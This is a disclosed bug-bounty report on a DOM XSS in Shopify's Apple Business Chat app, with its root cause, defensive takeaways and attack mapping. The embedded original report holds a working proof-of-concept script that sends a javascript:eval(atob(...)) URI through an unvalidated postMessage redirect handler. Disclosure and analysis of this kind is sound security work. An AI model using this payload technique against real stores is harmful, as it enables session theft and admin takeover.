# DOM XSS via Shopify.API.remoteRedirect in Apple Business Chat App

## Metadata
- **Source:** HackerOne
- **Report:** 646505 | https://hackerone.com/reports/646505
- **Submitted:** 2019-07-17
- **Reporter:** yxw21
- **Program:** Shopify
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** DOM-based XSS, Insecure postMessage Handler, Unsafe javascript: Protocol Handler
- **CVEs:** None
- **Category:** web-api

## Summary
A DOM-based XSS vulnerability exists in the Apple Business Chat Shopify app through the Shopify.API.remoteRedirect function. An attacker can craft a malicious theme code that abuses postMessage communication to inject arbitrary JavaScript code via javascript: protocol URIs. This allows complete compromise of the store owner's session and administrative access.

## Attack scenario
1. Attacker creates a malicious theme with embedded JavaScript that opens a popup to the vulnerable apple-business-chat-commerce.shopifycloud.com domain
2. Attacker crafts a javascript: URI payload containing eval() and base64-encoded malicious code (e.g., session stealing, admin creation)
3. JavaScript repeatedly sends postMessages with 'Shopify.API.remoteRedirect' and a data object containing the malicious javascript: URI
4. The vulnerable app receives the postMessage and processes the location parameter without sanitization, treating it as a valid redirect target
5. The javascript: URI is executed in the context of the Shopify admin domain, granting access to admin tokens and session data
6. Attacker receives confirmation via return postMessage and extracts credentials or performs admin actions

## Root cause
The Shopify.API.remoteRedirect handler in the apple-business-chat app accepts postMessage data without validating the location property. It fails to: (1) whitelist safe redirect URIs, (2) reject javascript: protocol handlers, (3) properly sanitize or validate postMessage origins, allowing arbitrary code execution via eval().

## Attacker mindset
Exploiting cross-origin communication mechanisms and JavaScript protocol handlers to bypass client-side security boundaries. Leveraging the trust relationship between store themes and Shopify APIs to execute privileged code with store owner permissions.

## Defensive takeaways
- Implement strict postMessage origin validation and only accept messages from whitelisted origins
- Validate and sanitize all redirect targets; reject javascript:, data:, and vbscript: protocols
- Never use eval() or Function() constructors to execute user-supplied or message-based data
- Use Content Security Policy (CSP) to restrict script-src and object-src directives
- Implement proper framing controls (X-Frame-Options, CSP frame-ancestors) to prevent embedding in malicious contexts
- Use postMessage targetOrigin parameter precisely rather than '*' wildcard
- Conduct regular security audits of app communication handlers and cross-origin interactions

## Variant hunting
Search for other Shopify app postMessage handlers accepting redirect/navigation parameters; audit any use of javascript: protocol parsing; check for similar eval() patterns in cloud-hosted Shopify apps; test other APIs exposed via postMessage (Shopify.API.*) for injection vectors; examine theme customization endpoints for XSS.

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1598 - Phishing
- T1059 - Command and Scripting Interpreter
- T1195 - Supply Chain Compromise (via malicious theme)

## Notes
Report lacks specific bounty amount and CVE assignment. The attack requires victim store owner interaction (clicking malicious theme link). Payload uses base64 encoding and timing-based postMessage delivery to bypass potential naive filters. Demonstrates critical risk of improper postMessage handling in third-party Shopify apps. The vulnerability chain (postMessage → remoteRedirect → javascript: → eval) exemplifies multiple security failures.

## Full report
<details><summary>Expand</summary>

Hi, team.
I found a dom xss on the apple-business-chat app that seems to be referring to a vulnerable js file.
For users who have installed this app, just let him use the theme code I provided to complete xss.
Modify the theme code to the following payload
```
<script>
	  function attack(){
	    let ctx=window.open('https://apple-business-chat-commerce.shopifycloud.com'),interval;
	    let payload=btoa(`window.opener.postMessage('success',location.origin);alert(document.domain)`);
	    interval=setInterval(()=>{
	        ctx && ctx.postMessage({
        		"message":"Shopify.API.remoteRedirect",
        		"data":{
        			"location":`javascript:eval(atob('${payload}'))`
        		}
	        },location.origin);
	    },500);
	    window.onmessage=(e)=>{
	    	e.data==="success"&&(
	    		console.log('attack success'),
	    		window.onmessage=null,
	    		clearInterval(interval)
	    	);
	    };
	  }
	  attack();
	</script>
	<a href="javascript:attack()" style="display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;">click me start attack</a>
```
As shown below
{F531015}
Then click on the store front page to trigger
{F531016}

*█████*

## Impact

Steal session information, add administrators, etc.

</details>

---
*Analysed by Claude on 2026-05-12*
